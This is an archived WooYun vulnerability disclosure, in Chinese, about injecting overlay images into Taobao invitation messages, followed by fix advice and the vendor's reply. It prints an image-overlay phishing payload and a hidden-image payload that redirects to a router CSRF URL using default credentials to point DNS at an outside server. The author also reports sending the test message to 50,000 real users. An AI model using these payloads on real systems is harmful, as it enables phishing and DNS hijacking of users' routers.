@@ -1,0 +1,250 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		对淘宝所有用户大规模DNS劫持攻击  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		对淘宝所有用户大规模DNS劫持攻击  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/bing">bing</a> 
+</li><li>提交时间：		2014-01-10 17:20</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-10：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-20：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-30：	细节向普通白帽子公开<br/>
+									2014-02-09：	细节向实习白帽子公开<br/>
+									2014-02-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">对所有用户的DNS劫持攻击</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1、第一种鸡肋利用方式XSIO攻击<br />
+<br />
+原本以为只是发现了鸡肋的xsio漏洞，不甘平凡测试一天想起我们还可以实现DNS劫持攻击将漏洞危害实现最大化。这些得从周五说起~<br />
+<br />
+又到周五晚刷分的时候啦！这个时候通过淘宝网站导航点进了淘宝小分队http://yiqi.taobao.com/，苦寻半天没有任何收获，这时候随意一瞥邀请加入引起了我的注意。<br />
+<br />
+</p><p class="detail"><a href="../images/101708227c426c45911ada6daf122c7f514b183a.jpg" target="_blank"><img src="../images/101708227c426c45911ada6daf122c7f514b183a.jpg" alt="11111111111111111.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+通过抓包发现邀请内容content参数为我们可控，心理小小的鸡动了一把，知道肯定有戏！<br />
+<br />
+</p><p class="detail"><a href="../images/1017085263f05ae90541b111aaef5bcc45dbc0b5.jpg" target="_blank"><img src="../images/1017085263f05ae90541b111aaef5bcc45dbc0b5.jpg" alt="2222222222222222.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+将content内容解码发现还支持&lt;、&gt;、/等字符又暗自窃喜了一把<br />
+<br />
+</p><p class="detail"><a href="../images/10170910fa355a2d51f303c0fac0ceee3070bc79.jpg" target="_blank"><img src="../images/10170910fa355a2d51f303c0fac0ceee3070bc79.jpg" alt="33333333333333.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+经过一番疯狂的测试发现对html事件、javascript敏感关键词全部都进行了严格过滤。但是，，，细心的白帽子还是发现了没有限制图片属性position为absolute，导致可以控制一张图片出现在网页的任意位置。那么我们就可以用这张图片去覆盖网页上的任意一个位置，包括网站的banner，包括一个link、一个button。这就可以导致页面破坏。而给图片设置一个链接后，很显然就可以起到一个钓鱼的作用，最终鸡肋的XSIO漏洞就实现了。利用代码如下<br />
+<br />
+</p><pre><code>a href=&quot;http://bingsec.com?spm=0.0.0.0.LyuuFi&quot; target=&quot;_blank&quot; data-spm-anchor-id=&quot;0.0.0.0&quot;&gt;&lt;img src=&quot;http://img01.taobaocdn.com/poster_pic/T1qMpCFrRXXXXXXXXX&quot; style=&quot;position: absolute;left:-110px;top:1px;&quot; width=&quot;240&quot; height=&quot;240&quot;&gt;&lt;/a&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这时候我们登录上淘宝http://www.taobao.com，成功的将发送者和其它内容遮挡。用户竟然发现淘宝几百年难得一遇的搞起了大抽奖还是肯定中奖这时候就进入了我们的钓鱼网站圈套啦~<br />
+<br />
+</p><p class="detail"><a href="../images/10171015a0fbc94156d5a7e557c4c1f73057be5c.jpg" target="_blank"><img src="../images/10171015a0fbc94156d5a7e557c4c1f73057be5c.jpg" alt="4444444444444444444.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+那如何说明xsio的危害范围呢？我们不要忘记了receiverIds参数，他是用户的唯一标识参数也就是说这个消息给哪个用户发送。可以看出参数内容为纯数字有规律，那说明是可实现自动化发送了。那我们就证明下我们的推断，也判断下这个发送接口是否对发送次数等做了限制。<br />
+<br />
+</p><p class="detail"><a href="../images/101710404bb017f78f2aee295e2adfe85b0cd7c9.jpg" target="_blank"><img src="../images/101710404bb017f78f2aee295e2adfe85b0cd7c9.jpg" alt="55555555555555555555555.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+这时候我向了5万用户发送了该测试内容，测试只是诱导点击指向我的blog。可以看出该接口，并没有对发送次数、时间、是否为好友等做验证，这也是导致大规模的关键因素。下面为24个小时的数据统计<br />
+<br />
+</p><p class="detail"><a href="../images/1017110532d9df95cfae71bc70bdf7fc269d6c2f.jpg" target="_blank"><img src="../images/1017110532d9df95cfae71bc70bdf7fc269d6c2f.jpg" alt="66666666666666666.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上图可以看出5万用户收到该内容，却只有100个用户受到影响。但XSIO是诱导用户点击才会受到诱骗。依靠淘宝强大用户注册量大胆推断下XSIO漏洞每天会有多少用户点击，我们以5亿用户为基础，5万用户有100个受到攻击，可以推算出每天会有至少100万用户受到该漏洞攻击。5万用户xsio攻击7日上线情况</p><p class="detail"><a href="../images/1017112560176c7f24f0b7abeac9a9c6a1f99f5f.jpg" target="_blank"><img src="../images/1017112560176c7f24f0b7abeac9a9c6a1f99f5f.jpg" alt="7777777777777777.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+虽然影响范围是有了，但是XSIO还是过于鸡肋。有没有办法突破被动为主动攻击呢？下文就有了，<br />
+<br />
+2、加强攻击方式DNS劫持<br />
+<br />
+<br />
+<br />
+新的攻击方法DNS劫持，DNS攻击的构造方法就不多做介绍了，看下面的攻击代码吧<br />
+<br />
+&lt;div style=&quot;display:none;&quot;&gt;&lt;img src=&quot;http://www.v5yw.net/bg.jpg&quot; width=0 height=0&gt;&lt;/div&gt;<br />
+<br />
+<br />
+<br />
+上面src源进行了302跳转。最终会跳到<br />
+<br />
+<br />
+<br />
+http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=&amp;dnsserver=54.248.102.5&amp;dnsserver2=8.8.8.8&amp;Save=%25B1%25A3+%25B4%25E6<br />
+<br />
+<br />
+<br />
+秀一张成功DNS劫持攻击被360拦截的截图，当用户浏览互动提醒就直接触发DNS劫持攻击。如果将5亿用户全部推送DNS劫持攻击，看来DNS服务器得很牛逼才行啊。这下体现出危害了，不管是吃广告费还是做支付宝钓鱼应该都很赚钱吧。。。<br />
+<br />
+</p><p class="detail"><a href="../images/10171230a7cd1f5c51d000bf3d7b082a464f1254.jpg" target="_blank"><img src="../images/10171230a7cd1f5c51d000bf3d7b082a464f1254.jpg" alt="888888888888888888888888.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/101712412d68a2e5b9c5fd67e02dce5a0026daf7.jpg" target="_blank"><img src="../images/101712412d68a2e5b9c5fd67e02dce5a0026daf7.jpg" alt="999999999999999999999999.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/10171230a7cd1f5c51d000bf3d7b082a464f1254.jpg" target="_blank"><img src="../images/10171230a7cd1f5c51d000bf3d7b082a464f1254.jpg" alt="888888888888888888888888.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/101712412d68a2e5b9c5fd67e02dce5a0026daf7.jpg" target="_blank"><img src="../images/101712412d68a2e5b9c5fd67e02dce5a0026daf7.jpg" alt="999999999999999999999999.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、过滤src源；<br />
+<br />
+2、过滤position属性为absolute<br />
+<br />
+3、限制发送次数&amp;判断是否为好友<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/bing" title="bing">bing</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048499" title="对淘宝所有用户大规模DNS劫持攻击">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：1 </p>
+													<p class="detail">确认时间：2014-01-10 17:50</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢你对我们的支持与关注，该问题已有白帽子提交到asrc，且正在修复中。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48499";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
